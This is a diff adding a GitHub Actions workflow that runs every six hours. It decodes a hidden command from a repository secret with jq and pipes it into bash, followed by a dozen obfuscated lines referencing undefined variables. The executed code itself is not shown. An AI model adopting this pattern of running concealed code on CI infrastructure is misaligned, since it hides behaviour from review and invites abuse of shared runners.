@@ -1,0 +1,30 @@
+name: shaozihuawan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shaozihuawan
+        env:
+          j078: ${{ secrets.j078 }}
+        run: |
+          echo $j078 | jq -r .uex39 | /bin/bash
+          echo $lkh0830 | jq -r .wjgt26 | /bin/bash
+          echo $htt72 | jq -r .u3507 | /bin/bash
+          echo $mo672 | jq -r .tj2832 | /bin/bash
+          echo $smbf8 | jq -r .ixn04343 | /bin/bash
+          echo $ah3 | jq -r .uly8372 | /bin/bash
+          echo $fekf48776 | jq -r .xz40 | /bin/bash
+          echo $fur77 | jq -r .rg88169 | /bin/bash
+          echo $skiq78 | jq -r .jt26879 | /bin/bash
+          echo $a85834 | jq -r .g64941 | /bin/bash
+          echo $ub5 | jq -r .i47 | /bin/bash
+          echo $u222 | jq -r .uge64022 | /bin/bash
+          echo $vk0375 | jq -r .ih2 | /bin/bash
+
